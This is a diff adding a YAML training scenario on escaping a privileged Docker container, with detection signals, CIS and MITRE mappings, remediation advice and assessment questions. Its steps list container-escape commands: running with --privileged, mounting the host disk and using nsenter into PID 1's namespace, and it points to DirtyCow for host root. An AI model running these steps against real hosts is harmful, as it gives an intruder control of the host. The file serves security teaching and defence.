@@ -1,0 +1,99 @@
+# Category: Container Security
+name: "Privileged Container – Host Kernel Exploitation"
+id: "container-privileged-container-001"
+category: "container_security"
+subcategory: "docker"
+difficulty: "advanced"
+estimated_time: "75 minutes"
+
+description: |
+  Run a container with the `--privileged` flag, which grants it almost all
+  capabilities and access to host devices. Attackers can then use this to
+  escape the container and gain host‑level access via kernel exploits or
+  device manipulation.
+
+learning_objectives:
+  - Understand what `--privileged` grants (capabilities, device access)
+  - Identify privileged containers in a cluster
+  - Use tools like `nsenter` or mount host proc
+  - Escape to host using file system mounts or kernel module loading
+
+tools:
+  - Docker CLI
+  - nsenter
+  - Capsh
+  - Python (for kernel exploit)
+
+prerequisites:
+  - Ability to create a container with `--privileged`
+  - Host kernel may be vulnerable (e.g., to CVE-2016-5195)
+
+steps:
+  - id: "step1"
+    phase: "setup"
+    action: "Create a privileged container"
+    commands:
+      - "# Run with --privileged"
+      - "docker run --privileged -it ubuntu bash"
+    expected_output: "Root shell inside container"
+    detection: "Audit logs of container creation with special flags"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Mount host root via /dev"
+    commands:
+      - "# Mount host's root"
+      - "mkdir /host"
+      - "mount /dev/sda1 /host"
+      - "# Or use /proc/1/root"
+      - "nsenter --target 1 --mount bash"
+    expected_output: "Access to host filesystem"
+    detection: "Mount events; file writes"
+
+  - id: "step3"
+    phase: "escalation"
+    action: "Use kernel exploit to get host root"
+    commands:
+      - "# Check kernel version"
+      - "uname -a"
+      - "# Use DirtyCow or other exploit if vulnerable"
+    expected_output: "Host root shell"
+    detection: "Kernel exploit detection (syscalls)"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1610"
+    description: "Deploy Container"
+  - standard: "CIS Docker Benchmark"
+    control: "4.1"
+    description: "Avoid privileged containers"
+
+detection:
+  network_indicators:
+    - "Container orchestration events"
+  log_indicators:
+    - "Container runtime logs with privileged flag"
+  endpoint_indicators:
+    - "Kernel module loading"
+
+remediation:
+  immediate:
+    - "Remove `--privileged` flag; use specific capabilities (--cap-add)"
+    - "Use seccomp and AppArmor profiles"
+  long_term:
+    - "Implement PodSecurityPolicy (Kubernetes) or admission controllers"
+    - "Regularly scan for privileged containers"
+
+variables:
+  host_mount: "/dev/sda1"
+
+assessment_questions:
+  - "What capabilities does `--privileged` grant beyond CAP_SYS_ADMIN?"
+  - "How can you restrict containers without using `--privileged`?"
+  - "What is the role of seccomp in container security?"
+
+references:
+  - url: "https://docs.docker.com/engine/security/security/"
+    title: "Docker Security"
+  - url: "https://kubernetes.io/docs/concepts/security/pod-security-standards/"
+    title: "Kubernetes Pod Security Standards"
